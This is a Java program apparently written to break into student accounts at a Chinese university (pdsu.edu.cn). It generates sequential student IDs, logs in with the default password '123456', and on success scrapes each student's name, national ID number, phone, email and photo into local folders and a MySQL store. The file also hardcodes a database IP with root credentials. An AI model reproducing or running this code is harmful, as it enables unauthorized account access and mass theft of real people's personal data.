package httpclient;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.ObjectInputStream.GetField;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.io.UnsupportedEncodingException;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.PreparedStatement;
import java.sql.SQLException;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import org.apache.http.Header;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.CookieStore;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.cookie.Cookie;
import org.apache.http.impl.client.AbstractHttpClient;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.nio.client.methods.HttpAsyncMethods;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.nodes.Element;
import org.jsoup.select.Elements;

public class httpclientPost {

	public httpclientPost() {
	}

	static int cg = 0;
	static int sbbb = 0;
	// 姓名
	static String Name = "";
	// 学号
	static String Num = "";
	// 专业
	static String ZY = "";
	// 院系
	static String YX = "";
	// 班级
	static String Class = "";
	static // 照片URL
	String PhURL = "";
	// 身份证号
	static String ID = "";
	// 手机号
	static String Phone = "";
	// 邮箱号
	static String mail = "";
	// 年级
	static String NJ = "";
	//
	static int flag = 0;
	static int nj = 0;
	static int dlsb = 0;
	static DefaultHttpClient client = new DefaultHttpClient();

	public static String changInputStream(InputStream inputStream, String encode) {
		ByteArrayOutputStream OutputStream = new ByteArrayOutputStream();
		byte[] data = new byte[1024];
		int len = 0;
		String result = "";
		if (inputStream != null) {
			try {
				while ((len = inputStream.read(data)) != -1) {
					OutputStream.write(data, 0, len);
				}
				result = new String(OutputStream.toByteArray(), encode);
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
		return result;

	}

	public static String sendHttpClientPost(String path, Map<String, String> map, String encode) {

		List<NameValuePair> list = new ArrayList<NameValuePair>();

		if (map != null && !map.isEmpty()) {
			for (Map.Entry<String, String> entry : map.entrySet()) {
				list.add(new BasicNameValuePair(entry.getKey(), entry.getValue()));
			}
		}

		try {
			// 实现将请求的参数封装到表单中
			UrlEncodedFormEntity entity = new UrlEncodedFormEntity(list, encode);
			HttpPost httppost = new HttpPost(path);

			httppost.setHeader("User-Agent",
					"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36");
			httppost.setHeader("Content-Type", "application/x-www-form-urlencoded");
			httppost.setHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
			httppost.setEntity(entity);

			// client = new DefaultHttpClient();
			HttpResponse httpResponse = client.execute(httppost);
			// 获取cookie

			int aa = httpResponse.getStatusLine().getStatusCode();
			String res = changInputStream(httpResponse.getEntity().getContent(), encode);
			if (aa == 200) {
				return res;

			} else if (aa == 302) {
				HttpGet get = new HttpGet("http://yyxt.pdsu.edu.cn/cet/default0.aspx");
				HttpResponse set = client.execute(get);
				get.abort();
				try {
					HttpGet gg = new HttpGet("http://yyxt.pdsu.edu.cn/cet/entry1.aspx");
					HttpResponse set1 = client.execute(gg);
					return changInputStream(set1.getEntity().getContent(), encode);
				} catch (Exception ee) {
					System.out.println(ee.toString());
				}

			} else {
				return "状态码:" + aa;
			}

		} catch (UnsupportedEncodingException e) {

			e.printStackTrace();
		} catch (ClientProtocolException e) {

			e.printStackTrace();
		} catch (IOException e) {

			e.printStackTrace();
		}

		return "失败";
	}

	/*
	 * 下载图片到本地
	 */
	public static void dl(String Url, HttpClient client) {

		HttpGet httpGet = new HttpGet(Url);
		StringBuilder sb = new StringBuilder();
		List<Cookie> cookies = ((AbstractHttpClient) client).getCookieStore().getCookies();
		for (int i = 0; i < cookies.size(); i++) {
			sb.append(cookies.get(i).getName() + "=" + cookies.get(i).getValue() + ";");
		}
		httpGet.setHeader("Accept", "image/webp,image/*,*/*;q=0.8");
		httpGet.setHeader("Accept-Encoding", "gzip, deflate, sdch");
		httpGet.setHeader("Accept-Language", "zh-CN,zh;q=0.8");
		httpGet.setHeader("User-Agent",
				"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36");
		httpGet.setHeader("Referer", "http://yyxt.pdsu.edu.cn/cet/entry1.aspx");
		httpGet.setHeader("Cookie", sb.toString());
		httpGet.setHeader("Host", "yyxt.pdsu.edu.cn");
		FileOutputStream fos;
		try {
			// 客户端开始向指定的网址发送请求
			HttpResponse response = client.execute(httpGet);
			InputStream inputStream = response.getEntity().getContent();
			String flieName = "j:\\平院学生信息数据库_17\\" + nj + "\\" + YX + "\\" + ZY + "\\" + Class + "\\" + Num + "_" + Name
					+ "\\";
			File file = new File(flieName);
			if (!file.exists()) {
				file.mkdirs();
			}

			fos = new FileOutputStream(flieName + Num + "_" + Name + ".jpg");
			byte[] data = new byte[1024];
			int len = 0;
			while ((len = inputStream.read(data)) != -1) {
				fos.write(data, 0, len);
			}
			fos.close();

			// 将个人信息写入
			String str = "学    号:" + Num + "\r\n\r\n姓    名:" + Name + "\r\n\r\n班    级:" + Class + "\r\n\r\n院    系:" + YX
					+ "\r\n\r\n专    业:" + ZY + "\r\n\r\n身份证号:" + ID + "\r\n\r\n手 机 号:" + Phone + "\r\n\r\n邮    箱:"
					+ mail + "\n";
			xrstr(flieName + Num + "_" + Name + ".txt", str);

			String path = flieName + Num + "_" + Name + ".jpg";
			FileInputStream in = ImageUtil.readImage(path);

			String ins = "insert into student_info values(?,?,?,?,?,?,?,?,?)";
			try {
				ps = conn.prepareStatement(ins);
				ps.setString(1, Num);
				ps.setString(2, Name);
				ps.setString(3, YX);
				ps.setString(4, ZY);
				ps.setString(5, Class);
				ps.setString(6, ID);
				ps.setString(7, Phone);
				ps.setString(8, mail);
				ps.setBinaryStream(9, in, in.available());
				// ps.setString(9, Num);

			} catch (SQLException | IOException e) {
				// TODO Auto-generated catch block
				System.out.println(e.toString());
				e.printStackTrace();
			}
			// '" + Num + "','" + Name + "','" + YX+ "','" + ZY + "','" + Class
			// + "','" +"','" + ID + "','" +"','" + Phone + "','" +"')";
			int kn;
//			try {
//
//				int count = ps.executeUpdate();
//				if (count > 0) {
//					System.out.println("插入成功！" + count + "行！");
//					cg++;
//				} else {
//					System.out.println("插入失败！");
//					sbbb++;
//				}
//			} catch (SQLException e) {
//				// TODO Auto-generated catch block
//				e.printStackTrace();
//			}
			try {
				ps.close();
			} catch (SQLException e) {
				// TODO Auto-generated catch block
				System.out.println(e.toString());
				e.printStackTrace();
			}

		} catch (IOException e) {
			// TODO Auto-generated catch block
			System.out.println(e.toString());
			e.printStackTrace();
		}
	}

	public static void xrstr(String flieName, String str) {
		File txt = new File(flieName);
		if (!txt.exists()) {
			try {
				txt.createNewFile();
				byte bytes[] = new byte[1024];
				bytes = str.getBytes(); // 新加的
				int b = str.length(); // 改
				FileOutputStream foss = new FileOutputStream(txt);
				foss.write(str.getBytes("UTF-8"));
				foss.close();

			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
	}

	static Connection conn = null;
	static PreparedStatement ps = null;
	static java.sql.Statement stat = null;

	public static void db() {
		String Mysql = "com.mysql.jdbc.Driver";
		String Sqlstr = "jdbc:mysql://139.129.46.146:3306/pdsu_Student?characterEncoding=utf-8";
		try {
			java.lang.Class.forName(Mysql);
			conn = DriverManager.getConnection(Sqlstr, "root", "0806");
			// stat = conn.createStatement();
			System.out.println("数据库链接成功！");
		} catch (SQLException e) {
			// TODO Auto-generated catch block
			System.out.println("数据库链接出错！");
			e.printStackTrace();
		} catch (ClassNotFoundException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	public static void main(String[] args) {
		// TODO Auto-generated method stub

		Map<String, String> MapAllzy = new HashMap<String, String>();
		Map<String, String> MapAllclass = new HashMap<String, String>();
		Map<String, String> MapAllyx = new HashMap<String, String>();
		Date date = new Date();
		DateFormat format = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
		long start = System.currentTimeMillis();
		
		Map<String, String> zymap = new HashMap<String, String>();
		db();
		zymap = SetMapZY.SetMapyy(zymap);
		String path = "http://szhpt.pdsu.edu.cn/login_net1.aspx";
		String encode = "utf-8";
		for (nj = 14; nj < 15; nj++) {
			int Allstu = 0;
			for (Map.Entry<String, String> entry : zymap.entrySet()) {
				for (int x = 1; x < 6; x++) {
					for (int k = 0; k < 80; k++) {

						Map<String, String> map = new HashMap<String, String>();
						map.put("Bdl", "��¼");
						map.put("__VIEWSTATE", "/wEPDwULLTExNTc2NTI3OTlkZFizXxmxM2I3lLeYmJvVeuCfnIjc");
						map.put("__EVENTVALIDATION",
								"/wEWBAKpmZSiCAKeq5+XAgKlueiABQL8z67rChPBkREEBLHd8IJxbYGJ3itgkLlZ");
						map.put("__VIEWSTATEGENERATOR", "5E26995F");
						if (k < 10) {
							map.put("Tzh", nj + entry.getValue() + x + "0" + k);
						} else
							map.put("Tzh", nj + entry.getValue() + x + k);
						map.put("Tmm", "123456");
						String result = httpclientPost.sendHttpClientPost(path, map, encode);
						// System.out.println(result);
						Document doc = Jsoup.parse(result);
						Elements content = doc.select("table[style] input ");
						// Elements links =
						// content.getElementsByTag("tr");table[style][cellspacing][cellpadding][border]
						if (content.size() != 0) {
							int i = 0;
							for (Element link : content) {
								// String linkHref = link.attr("span");
								String linkText = link.val();
								i++;
								// 学号
								if (i == 1) {
									Num = linkText;

								}
								if (i == 2) {
									Name = linkText;
									Allstu++;
								}
								if (i == 3) {
									// 证件照链接
									PhURL = "http://yyxt.pdsu.edu.cn/cet/"
											+ doc.select("#ctl00_ContentPlaceHolder1_Image1").attr("src");
									PhURL = PhURL.replaceAll("\\\\", "/");
									System.out.println("图片链接--->" + PhURL);
								}
								// 年级
								if (i == 4) {
									NJ = linkText;
								}

								// 院系
								if (i == 5) {
									YX = linkText;
									MapAllyx.put(YX, YX);
								}
								// 专业
								if (i == 6) {
									ZY = linkText;
									MapAllzy.put(ZY, ZY);
								}
								// 班级
								if (i == 7) {
									Class = linkText;
									MapAllclass.put(Class, Class);
								}
								// 身份证号
								if (i == 9) {
									ID = linkText;
								}
								// 手机证号
								if (i == 10) {
									Phone = linkText;
								}
								// 邮箱账号
								if (i == 11) {
									mail = linkText;
								}

							}
							httpclientPost.dl(PhURL, client);
							// String regEx =
							// "_GB2312(.*?)color=\"LightSeaGreen\">(.*?)</f";
							// Pattern pat = Pattern.compile(regEx);
							// Matcher mat = pat.matcher(result);
							// boolean rs = mat.find();
							// String STR = mat.group(0);
							//
							// String regEX1 = "[\u4e00-\u9fa5]+";
							// Pattern pat1 = Pattern.compile(regEX1);
							// Matcher mat1 = pat1.matcher(STR);
							// boolean rs1 = mat1.find();
							// System.out.println(mat1.group(0));
							flag = 0;

						} else {
							flag++;
							if (flag == 10)
								break;
							dlsb++;
							System.out.println("登录失败！");
						}

					}
				}
			}
			String str = "院系个数:" + MapAllyx.size() + "\r\n" + "专业个数:" + MapAllzy.size() + "\r\n" + "班级个数:"
					+ MapAllclass.size() + "\r\n" + "学生人数:" + Allstu + "\r\n";
			xrstr("j:\\平院学生信息数据库_17\\" + nj + "\\年级情况总汇.txt", str);
		}
		try {
			conn.close();
		} catch (SQLException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		 long end = System.currentTimeMillis();
		xrstr("j:\\平院学生信息数据库_17\\数据库写入总汇.txt", "成功插入数据：" + cg + "条\n\n有" + sbbb + "条数据，插入失败!\n\n运行时间：" + (end - start) + "毫秒\n\n有"+dlsb+"条，登录失败！");
		System.out.println("\n\n结束！	成功插入数据：" + cg + "\n\n有" + sbbb + "条数据，插入失败!\n\n运行时间：" + (end - start) + "毫秒\n\n有"+dlsb+"条登录失败！");
	}

}
